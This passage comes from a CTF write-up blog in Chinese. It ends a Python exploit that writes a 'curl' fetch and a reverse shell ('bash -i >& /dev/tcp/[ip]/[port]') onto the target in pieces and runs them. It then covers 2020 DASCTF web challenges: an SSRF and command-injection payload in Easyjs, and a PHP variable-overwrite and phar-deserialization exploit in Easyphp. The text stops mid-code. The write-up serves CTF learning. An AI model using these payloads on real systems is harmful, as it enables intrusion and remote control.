operator">=</span> <span class="token string">"curl [ip]/[filename]>1"</span>    i <span class="token operator">=</span> <span class="token number">0</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"echo '"</span> <span class="token operator">+</span> payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\c'>1d"</span>            execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">5</span>            flag <span class="token operator">-=</span><span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string">"echo '"</span><span class="token operator">+</span>payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\c'>>1d"</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        i <span class="token operator">+=</span><span class="token number">5</span>    check<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"1d"</span><span class="token punctuation">)</span>    <span class="token comment"># bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"sh 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"/?in/[a-c]ash 1"</span><span class="token punctuation">)</span></code></pre><hr><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å¾ˆæœ‰æ”¶è·ï¼Œä¸æ‰è¿™ä¸¤é¢˜ï¼Œå°¤å…¶çš„ç¬¬äºŒé¢˜ï¼Œéå¸¸æœ‰ä»·å€¼ã€‚</p><p>å½“ç„¶ä¸èƒ½å°çœ‹ç¬¬ä¸€é¢˜ï¼Œåˆ«çœ‹WPçŸ­çŸ­å‡ è¡Œï¼ŒèƒŒåæ˜¯æ— æ•°æ¬¡çš„å°è¯•ä¸æ¢ç´¢ï¼Œç¬¬äºŒé¢˜æ›´æ˜¯å¦‚æ­¤ã€‚</p><p>2020å¹´æœ€åä¸€ä»½WPï¼Œè¿˜æœ‰å¾ˆé•¿è·¯è¦èµ°ï¼ŒåŠ æ²¹å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020DASctf-Writeup</title>
      <link href="article/dasctf2020/"/>
      <url>article/dasctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020DASCTF-Write-up"><a href="#2020DASCTF-Write-up" class="headerlink" title="2020DASCTF Write-up"></a>2020DASCTF Write-up</h2><p>é˜Ÿä¼åç§°ï¼šTest1024</p><p>é˜Ÿä¼æˆå‘˜ï¼š</p><p>gyyï¼ŒTrickï¼ŒX06</p><p>é˜Ÿä¼æƒ…å†µï¼š</p><hr><img src="/article/dasctf2020/image-20201226160717993.png" class="" title loading="lazy"><img src="/article/dasctf2020/image-20201226160703650.png" class="" title="range" loading="lazy"><hr><p>ç»§ç»­å­¦ä¹ å§ï¼Œè¿˜æ˜¯å¤ªèœäº†</p><a id="more"></a><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h4><p>2020ç½‘é¼æ¯çº¿ä¸‹åŠå†³èµ›web_babyJSï¼Œè¿‘ä¹åŸé¢˜</p><p>æ‰“å¼€å³ä¸ºç©ºçš„json</p><img src="/article/dasctf2020/image-20201226161339893.png" class="" title="image-20201226161339893" loading="lazy"><p>ç»™äº†æºç ï¼Œå…³é”®webé€»è¾‘<code>routes\index.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> url<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child_process<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> request<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blacklist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'127.0.0.1.xip.io'</span><span class="token punctuation">,</span><span class="token string">'::ffff:127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token string">'[::1]'</span><span class="token punctuation">,</span><span class="token string">'::1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> u<span class="token operator">=</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\"\']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> log<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo  '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'>>/tmp/log</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>child_process<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>data<span class="token operator">:</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/tmp/log'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> u <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url<span class="token punctuation">;</span><span class="token keyword">var</span> urlObject<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>urlObject<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dest<span class="token operator">=</span>urlObject<span class="token punctuation">.</span>href<span class="token punctuation">;</span><span class="token function">request</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>result<span class="token punctuation">,</span>body</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>æœ‰ä¸ªdebugè·¯å¾„ï¼Œè¯·æ±‚ä¼šåˆ¤æ–­æ˜¯ä¸æ˜¯æœ¬åœ°å›ç¯è®¿é—®ï¼Œå³<code>127.0.0.1</code>ç­‰ï¼Œä¸æ˜¯åˆ™è¿”å›ç©ºjsonã€‚å¦‚æœæ˜¯æœ¬åœ°è®¿é—®å°±ä¼šè¯»å–getä¸­urlå‚æ•°ï¼Œå»é™¤å•åŒå¼•å·ç”¨nodejsçš„url.parseè§£æï¼Œè§£æåçš„urlæ‹¼æ¥åˆ°shellå‘½ä»¤ä¸­æ‰§è¡Œï¼Œè¾“å‡º<code>/tmp/log</code>å†è¿”å›å†…å®¹ã€‚</p><p>ç”±æ­¤ï¼Œåº”å…ˆPOST<code>/debug</code>ï¼Œ åœ¨<code>url</code>å‚æ•°ä¸­ç»•è¿‡blacklistï¼Œè®©ç¨‹åºå†GETè¯·æ±‚è‡ªå·±çš„<code>/debug</code>è·¯å¾„ï¼Œä¹‹åæ„é€ æ³¨å…¥å‘½ä»¤ã€‚</p><p>è€ƒå¯Ÿä¸€ä¸ªSSRFï¼Œæ„é€ payloadï¼š<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527@xx&quot;&#125;</code>æœ€åé—­åˆå¼•å·</p><p>ç„¶åè€ƒè™‘æŠŠflagæ–‡ä»¶å¤åˆ¶åˆ°<code>/tmp/log</code>ï¼Œåˆ©ç”¨<code>$IFS</code></p><p>æœ€ç»ˆpayloadï¼š<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527;%2527@xx;cp$IFS/tmp/flag$IFS/tmp/log%00&quot;&#125;</code></p><hr><h4 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h4><p>ç¥å¥‡çš„pharååºåˆ—åŒ–</p><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'template.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'tp1'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp1.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp2'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp2.tpl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'tp3'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'tp3.tpl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$tp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$tp</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"No! You only have 3 template to reader"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">[</span><span class="token variable">$tp</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Please choice one template to reader"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å…³é”®ç‚¹<code>exract</code>ï¼Œå¯è§å˜é‡è¦†ç›–<code>template</code>å†åˆ©ç”¨<code>tp</code>è¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚ä¸è¿‡ä¸å¯èƒ½ç›´æ¥è¯»flagçš„ï¼Œå…ˆè¯»äº†<code>template.php</code></p><p><code>./?var[template][1]=template.php&amp;tp=1</code></p><pre class="language-php" data-language="php"><code class="language-php">//template.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".html"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æ³¨æ„åˆ°å…³é”®ç‚¹æœ‰ä¸ªå…¨å±€å˜é‡ï¼Œè”æƒ³åˆ°ä¹‹å‰çš„å˜é‡è¦†ç›–ï¼Œè¿™é‡Œè‚¯å®šæ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚</p><p>ç±»<code>Template</code>å¤§æ¦‚æ„æ€å°±æ˜¯ä¼ å…¥çš„<code>content</code>ï¼Œåˆ©ç”¨<code>pattern</code>è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œåˆ©ç”¨å…¨å±€å˜é‡ä¸­çš„å€¼æ›¿æ¢åŒ¹é…åˆ°çš„å€¼ï¼Œæœ€åè¾“å‡ºä»¥<code>suffix</code>åç¼€çš„æ–‡ä»¶ã€‚</p><p>æ‘¸ç´¢ä¸€ç•ªåç¡®è®¤ä¸ºç¥å¥‡çš„pharååºåˆ—åŒ–ï¼Œè€ƒç‚¹ä¸ºæ–‡ä»¶ä¸Šä¼ å’Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>åˆ©ç”¨è„šæœ¬ç”Ÿæˆpharæ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Template</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&#123;&#123;gyycoming&#125;&#125;"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/&#123;&#123;([a-z]+)&#125;&#125;/"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".php"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean constant">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">global</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pattern</span><span class="token punctuation">,</span> <span class="token 